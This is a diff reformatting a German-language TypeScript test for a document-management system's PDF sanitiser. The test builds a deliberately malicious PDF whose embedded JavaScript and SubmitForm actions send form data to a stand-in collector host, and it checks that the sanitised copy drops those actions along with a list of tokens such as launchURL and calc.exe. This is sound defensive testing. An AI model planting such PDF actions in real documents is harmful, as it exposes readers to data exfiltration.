@@ -33,18 +33,26 @@ async function boesesPdf(): Promise<Buffer> {
   // Namensbaum mit Skript und eingebetteter Datei.
   const datei = ctx.register(ctx.stream(ANHANG, { Type: 'EmbeddedFile' }));
   const spec = ctx.obj({ Type: 'Filespec', F: PDFString.of('anhang.txt'), EF: { F: datei } });
-  doc.catalog.set(PDFName.of('Names'), ctx.obj({
-    JavaScript: { Names: [PDFString.of('start'), ctx.obj({ S: 'JavaScript', JS: PDFString.of('this.submitForm("https://sammler.example.org")') })] },
-    EmbeddedFiles: { Names: [PDFString.of('anhang.txt'), spec] },
-  }));
+  doc.catalog.set(
+    PDFName.of('Names'),
+    ctx.obj({
+      JavaScript: {
+        Names: [PDFString.of('start'), ctx.obj({ S: 'JavaScript', JS: PDFString.of('this.submitForm("https://sammler.example.org")') })],
+      },
+      EmbeddedFiles: { Names: [PDFString.of('anhang.txt'), spec] },
+    }),
+  );
   // Anmerkungen: Formular senden, Fernziel, Dateianhang – und ein normaler Link.
   const anm = (o: Record<string, unknown>) => ctx.register(ctx.obj({ Type: 'Annot', Rect: [10, 10, 60, 30], ...o }));
-  seite.node.set(PDFName.of('Annots'), ctx.obj([
-    anm({ Subtype: 'Link', A: { S: 'SubmitForm', F: { FS: 'URL', F: PDFString.of('https://sammler.example.org/form') } } }),
-    anm({ Subtype: 'Link', A: { S: 'GoToR', F: PDFString.of('anders.pdf'), D: [0, PDFName.of('Fit')] } }),
-    anm({ Subtype: 'FileAttachment', FS: spec }),
-    anm({ Subtype: 'Link', A: { S: 'URI', URI: PDFString.of('https://www.example.org/hilfe') } }),
-  ]));
+  seite.node.set(
+    PDFName.of('Annots'),
+    ctx.obj([
+      anm({ Subtype: 'Link', A: { S: 'SubmitForm', F: { FS: 'URL', F: PDFString.of('https://sammler.example.org/form') } } }),
+      anm({ Subtype: 'Link', A: { S: 'GoToR', F: PDFString.of('anders.pdf'), D: [0, PDFName.of('Fit')] } }),
+      anm({ Subtype: 'FileAttachment', FS: spec }),
+      anm({ Subtype: 'Link', A: { S: 'URI', URI: PDFString.of('https://www.example.org/hilfe') } }),
+    ]),
+  );
   doc.catalog.set(PDFName.of('AcroForm'), ctx.obj({ Fields: [], XFA: PDFString.of('<xdp/>') }));
   return Buffer.from(await doc.save({ useObjectStreams: false }));
 }
@@ -63,17 +71,35 @@ describe('PDF-Anzeige (#639): bereinigte Kopie', () => {
     assert.deepEqual(nachher.aktionen, ['URI'], 'nur der normale Link bleibt');
     assert.deepEqual(nachher.extern, ['https://www.example.org/hilfe']);
     const roh = Buffer.from(pdf).toString('latin1');
-    for (const t of ['launchURL', 'app.alert', 'submitForm', 'calc.exe', ANHANG, '/EmbeddedFile', '/OpenAction', '/XFA', 'FileAttachment', 'anders.pdf']) assert.ok(!roh.includes(t), `${t} steht noch in der Kopie`);
+    for (const t of [
+      'launchURL',
+      'app.alert',
+      'submitForm',
+      'calc.exe',
+      ANHANG,
+      '/EmbeddedFile',
+      '/OpenAction',
+      '/XFA',
+      'FileAttachment',
+      'anders.pdf',
+    ])
+      assert.ok(!roh.includes(t), `${t} steht noch in der Kopie`);
     assert.ok(roh.includes('www.example.org/hilfe'));
     assert.ok(entfernt.includes('OpenAction') && entfernt.includes('JavaScript') && entfernt.includes('EF'), entfernt.join(', '));
     // Ein harmloses PDF bleibt lesbar und meldet nichts.
-    const harmlos = await PDFDocument.create(); harmlos.addPage();
+    const harmlos = await PDFDocument.create();
+    harmlos.addPage();
     assert.deepEqual((await bereinigePdf(await harmlos.save())).entfernt, []);
   });
 
   it('verschlüsselt oder kaputt: wirft', async () => {
     await assert.rejects(bereinigePdf(Buffer.from('%PDF-1.7\nkaputt')));
-    const enc = Buffer.from((await boesesPdf()).toString('latin1').replace('trailer\n<<', 'trailer\n<<\n/Encrypt << /Filter /Standard /V 1 /R 2 /O <00> /U <00> /P -4 >>'), 'latin1');
+    const enc = Buffer.from(
+      (await boesesPdf())
+        .toString('latin1')
+        .replace('trailer\n<<', 'trailer\n<<\n/Encrypt << /Filter /Standard /V 1 /R 2 /O <00> /U <00> /P -4 >>'),
+      'latin1',
+    );
     await assert.rejects(bereinigePdf(enc), /verschlüsselt|encrypt/i);
   });
 
@@ -83,15 +109,22 @@ describe('PDF-Anzeige (#639): bereinigte Kopie', () => {
     const konten = new Konten(speicherKontoRepo(), null, 'http://nas', d.systemtypen.benutzerspiegel());
     const { benutzer: admin } = await konten.einrichten({ email: 'admin@example.org', name: 'Lena', passwort: 'ein-langes-passwort' });
     await d.postSystemmappen.gleicheBenutzerAb(await konten.listeBenutzer());
-    const typ = await d.mappentypen.legeTypAn({ name: 'Rechnung', felder: [{ key: 'nr', label: 'Nr', typ: 'text', pflicht: true }], register: [
-      { key: 'allgemein', name: 'Allgemein', art: 'felder', felder: ['nr'] }, { key: 'dokumente', name: 'Dokumente', art: 'dokumente', versionierung: true },
-    ] });
+    const typ = await d.mappentypen.legeTypAn({
+      name: 'Rechnung',
+      felder: [{ key: 'nr', label: 'Nr', typ: 'text', pflicht: true }],
+      register: [
+        { key: 'allgemein', name: 'Allgemein', art: 'felder', felder: ['nr'] },
+        { key: 'dokumente', name: 'Dokumente', art: 'dokumente', versionierung: true },
+      ],
+    });
     const m = await d.mappen.legeMappeAn({ typId: typ.id, werte: { nr: 'B-1' } });
     const original = await boesesPdf();
-    const id = (await d.dokumente.ladeHoch(m.id, { register: 'dokumente', name: 'brief.pdf', typ: 'application/pdf' }, original, null)).dokument.id;
+    const id = (await d.dokumente.ladeHoch(m.id, { register: 'dokumente', name: 'brief.pdf', typ: 'application/pdf' }, original, null))
+      .dokument.id;
     const tabelle = routen(d, konten, {});
     const inhalt = tabelle.find((r) => r.methode === 'GET' && r.pfad === '/api/dokumente/:id/inhalt')!;
-    const rufe = async (x: Partial<Anfrage> = {}) => (await inhalt.handler({ body: {}, params: { id }, query: {}, ip: '1', benutzer: admin, ...x } as Anfrage)).datei as Datei;
+    const rufe = async (x: Partial<Anfrage> = {}) =>
+      (await inhalt.handler({ body: {}, params: { id }, query: {}, ip: '1', benutzer: admin, ...x } as Anfrage)).datei as Datei;
     const anzeige = await rufe();
     assert.equal(anzeige.anzeigen, true);
     assert.equal(anzeige.koepfe?.['x-dms-anzeige'], 'bereinigt');
@@ -102,15 +135,23 @@ describe('PDF-Anzeige (#639): bereinigte Kopie', () => {
     const laden = await rufe({ query: { herunterladen: '1' } });
     assert.equal(laden.anzeigen, false);
     assert.equal(laden.koepfe?.['x-dms-anzeige'], undefined);
-    const roh = async (x: Datei) => Buffer.isBuffer(x.inhalt) ? x.inhalt : Buffer.concat(await x.inhalt.toArray());
+    const roh = async (x: Datei) => (Buffer.isBuffer(x.inhalt) ? x.inhalt : Buffer.concat(await x.inhalt.toArray()));
     assert.ok((await roh(laden)).equals(original), 'Herunterladen: Original');
     const api = await rufe({ apiSchluessel: { id: 'k1', recht: 'lesen' } as never });
     assert.equal(api.koepfe?.['x-dms-anzeige'], undefined);
     assert.ok((await roh(api)).equals(original), 'API-Schlüssel: Original');
     // Unbereinigbar: Hinweis statt Anzeige, in der Sandbox.
-    const kaputt = (await d.dokumente.ladeHoch(m.id, { register: 'dokumente', name: 'kaputt.pdf', typ: 'application/pdf' }, Buffer.from('%PDF-1.7\nkaputt'), null)).dokument;
+    const kaputt = (
+      await d.dokumente.ladeHoch(
+        m.id,
+        { register: 'dokumente', name: 'kaputt.pdf', typ: 'application/pdf' },
+        Buffer.from('%PDF-1.7\nkaputt'),
+        null,
+      )
+    ).dokument;
     assert.equal(kaputt.mime, 'application/pdf');
-    const h = (await inhalt.handler({ body: {}, params: { id: kaputt.id }, query: {}, ip: '1', benutzer: admin } as Anfrage)).datei as Datei;
+    const h = (await inhalt.handler({ body: {}, params: { id: kaputt.id }, query: {}, ip: '1', benutzer: admin } as Anfrage))
+      .datei as Datei;
     assert.equal(h.koepfe?.['x-dms-anzeige'], 'nur-herunterladen');
     assert.match(String(h.inhalt), /herunter/);
     assert.match(dateiKoepfe(h)['content-security-policy'] ?? '', /sandbox/);
